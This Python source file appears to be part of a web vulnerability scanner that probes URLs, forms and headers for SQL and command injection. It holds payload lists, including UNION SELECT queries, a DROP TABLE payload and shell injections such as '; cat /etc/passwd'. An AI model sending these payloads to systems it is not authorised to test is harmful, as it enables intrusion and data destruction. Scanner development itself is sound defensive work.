"""
SQL Injection and Command Injection Detection Module
"""
import asyncio
import logging
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

from ..core.http_client import AsyncHTTPClient

logger = logging.getLogger(__name__)


class InjectionDetector:
    """
    Advanced SQL Injection and Command Injection detector
    """
    
    SQL_PAYLOADS = {
        'error_based': [
            "'",
            "''",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR 1=1",
            "' OR 1=1 --",
            "' OR 1=1/*",
            "') OR '1'='1",
            "') OR ('1'='1",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' AND 1=1",
            "' AND 1=2",
            "' AND 1=1 --",
            "' AND 1=2 --",
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT pg_sleep(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
            "1' AND 1=1",
            "1' AND 1=2",
            "1 AND 1=1",
            "1 AND 1=2",
            "' HAVING 1=1",
            "' GROUP BY columnnames having 1=1--",
        ],
        'time_based': [
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT pg_sleep(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
            "' AND SLEEP(5)",
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),5)",
            "' AND 1=CTXSYS.DRITHSX.SN(1,5*1000)",
        ],
        'union_based': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT @@version--",
            "' UNION SELECT user()--",
            "' UNION SELECT database()--",
            "' UNION SELECT table_name FROM information_schema.tables--",
        ]
    }
    
    COMMAND_PAYLOADS = [
        '; cat /etc/passwd',
        '; ls -la',
        '; id',
        '; whoami',
        '| cat /etc/passwd',
        '| ls -la',
        '| id',
        '| whoami',
        '$(cat /etc/passwd)',
        '`cat /etc/passwd`',
        '; ping -c 5 127.0.0.1',
        '; sleep 5',
        '& sleep 5',
        '| sleep 5',
    ]
    
    ERROR_SIGNATURES = [
        'sql syntax',
        'mysql_fetch',
        'pg_query',
        'ora-',
        'oracle',
        'microsoft sql',
        'odbc',
        'jdbc',
        'sql server',
        'syntax error',
        'unexpected',
        'warning: mysql',
        'postgresql',
        'sqlite',
        'sql error',
    ]
    
    def __init__(self, http_client: AsyncHTTPClient):
        self.http_client = http_client
        self.findings: List[Dict] = []
    
    async def scan(
        self,
        urls: List[str],
        intensity: str = "medium",
        authentication: Optional[Dict] = None,
        forms: Optional[List[Dict]] = None
    ) -> List[Dict]:
        """
        Scan URLs and forms for injection vulnerabilities
        """
        logger.info(f"Starting injection scan on {len(urls)} URLs")
        
        # Select payloads based on intensity
        payloads = self._get_payloads_for_intensity(intensity)
        
        tasks = []
        for url in urls:
            tasks.append(self._scan_url(url, payloads, authentication))
        
        if forms:
            tasks.append(self.test_forms(forms, intensity))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        return self.findings

    async def test_forms(
        self,
        forms: List[Dict],
        intensity: str = "medium"
    ):
        """Test discovered HTML forms (POST and GET) for SQL injection"""
        payloads = self._get_payloads_for_intensity(intensity).get("error_based", [])[:5]
        for form in forms:
            action = form.get("action")
            if not action:
                continue
            method = form.get("method", "GET").upper()
            inputs = form.get("inputs", [])
            if not inputs:
                continue

            for input_field in inputs:
                param_name = input_field.get("name")
                if not param_name:
                    continue

                for payload in payloads:
                    data = {}
                    for f in inputs:
                        fname = f.get("name")
                        if not fname:
                            continue
                        if fname == param_name:
                            data[fname] = payload
                        else:
                            data[fname] = f.get("value", "test")

                    try:
                        if method == "POST":
                            resp = await self.http_client.post(action, data=data)
                        else:
                            resp = await self.http_client.get(action, params=data)

                        if resp:
                            text = await resp.text()
                            if self._check_error_signatures(text):
                                finding = {
                                    "type": "sql_injection",
                                    "subtype": "form_based",
                                    "url": action,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "evidence": f"Form submission ({method}) triggered database error signature",
                                    "severity": "critical",
                                    "description": f"SQL Injection detected in HTML form field '{param_name}' at {action}",
                                    "remediation": "Use parameterized queries or ORM models. Validate and sanitize form input."
                                }
                                self.findings.append(finding)
                                logger.warning(f"SQL Injection in form: {action} field={param_name}")
                                break
                    except Exception as e:
                        logger.debug(f"Form injection test error: {e}")
    
    def _get_payloads_for_intensity(self, intensity: str) -> Dict[str, List[str]]:
        """Get payloads based on scan intensity"""
        if intensity == "low":
            return {'error_based': self.SQL_PAYLOADS['error_based'][:5]}
        elif intensity == "medium":
            return {
                'error_based': self.SQL_PAYLOADS['error_based'][:15],
                'union_based': self.SQL_PAYLOADS['union_based'][:3]
            }
        else:  # high
            return self.SQL_PAYLOADS
    
    async def _scan_url(
        self,
        url: str,
        payloads: Dict[str, List[str]],
        authentication: Optional[Dict]
    ):
        """Scan a single URL for injections"""
        parsed = urlparse(url)
        
        # Skip non-HTTP(S) URLs
        if parsed.scheme not in ['http', 'https']:
            return
        
        # Test URL parameters
        if parsed.query:
            await self._test_url_parameters(url, parsed, payloads, authentication)
        
        # Test forms (if discovered)
        # This would be expanded with form testing
        
        # Test headers
        await self._test_headers(url, payloads, authentication)
    
    async def _test_url_parameters(
        self,
        url: str,
        parsed,
        payloads: Dict[str, List[str]],
        authentication: Optional[Dict]
    ):
        """Test URL query parameters for injection"""
        params = parse_qs(parsed.query)
        
        for param_name in params.keys():
            for payload_type, payload_list in payloads.items():
                for payload in payload_list:
                    # Create test URL with payload
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    
                    result = await self.http_client.test_payload(
                        test_url,
                        'GET',
                        payload=payload,
                        parameter=param_name
                    )
                    
                    if self._is_vulnerable(result, payload_type):
                        finding = {
                            'type': 'sql_injection',
                            'subtype': payload_type,
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': {
                                'status': result['status'],
                                'indicators': result['indicators'],
                                'response_time': result['response_time']
                            },
                            'severity': 'critical' if payload_type == 'error_based' else 'high',
                            'description': f"SQL Injection vulnerability detected in parameter '{param_name}' using {payload_type} technique",
                            'remediation': "Use parameterized queries/prepared statements. Validate and sanitize all user inputs."
                        }
                        self.findings.append(finding)
                        logger.warning(f"SQL Injection found: {url} param={param_name}")
                        return  # Stop testing this parameter once vulnerable
    
    async def _test_headers(self, url: str, payloads: Dict, authentication: Optional[Dict]):
        """Test HTTP headers for injection"""
        # Test User-Agent and Referer headers
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For']
        
        for header in headers_to_test:
            for payload in payloads['error_based'][:3]:
                custom_headers = {header: payload}
                response = await self.http_client.get(url, headers=custom_headers)
                
                if response:
                    text = await response.text()
                    if self._check_error_signatures(text):
                        self.findings.append({
                            'type': 'sql_injection',
                            'subtype': 'header_based',
                            'url': url,
                            'parameter': header,
                            'payload': payload,
                            'severity': 'high',
                            'description': f"SQL Injection in HTTP header '{header}'",
                            'remediation': "Sanitize header values before using in database queries"
                        })
    
    def _is_vulnerable(self, result: Dict, payload_type: str) -> bool:
        """Determine if response indicates vulnerability"""
        # Check for error indicators
        if result['indicators']:
            return True
        
        # For time-based, check response time
        if payload_type == 'time_based' and result['response_time']:
            if result['response_time'] > 4:  # Expected delay was 5 seconds
                return True
        
        return False
    
    def _check_error_signatures(self, text: str) -> bool:
        """Check if response contains SQL error signatures"""
        text_lower = text.lower()
        return any(sig in text_lower for sig in self.ERROR_SIGNATURES)
    
    async def scan_command_injection(self, urls: List[str]) -> List[Dict]:
        """
        Scan for command injection vulnerabilities
        """
        command_findings = []
        
        for url in urls:
            parsed = urlparse(url)
            if not parsed.query:
                continue
            
            params = parse_qs(parsed.query)
            
            for param_name in params.keys():
                for payload in self.COMMAND_PAYLOADS:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    
                    response = await self.http_client.get(test_url)
                    if response and response.status == 200:
                        text = await response.text()
                        
                        # Check for command output indicators
                        if any(indicator in text for indicator in ['root:', 'bin:', 'daemon:', 'uid=', 'gid=']):
                            command_findings.append({
                                'type': 'command_injection',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'severity': 'critical',
                                'description': f"Command Injection in parameter '{param_name}'",
                                'evidence': text[:500],
                                'remediation': "Never pass user input directly to system commands. Use allowlists and input validation."
                            })
        
        return command_findings